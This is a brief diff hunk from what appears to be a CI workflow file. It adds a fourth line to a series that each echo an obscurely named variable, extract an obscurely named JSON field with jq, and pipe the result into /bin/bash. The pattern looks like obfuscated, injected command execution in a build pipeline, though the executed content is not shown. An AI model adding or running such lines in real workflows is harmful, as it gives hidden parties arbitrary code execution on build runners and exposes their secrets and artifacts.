@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$clt914" | jq -r .yitvx25461 | /bin/bash
           echo $fnuf18 | jq -r .kcjac35 | /bin/bash
           echo $zdi6 | jq -r .rxwc5936 | /bin/bash
+          echo $ckyv247 | jq -r .snh149 | /bin/bash
 
       - name: Upload data
         if: always()
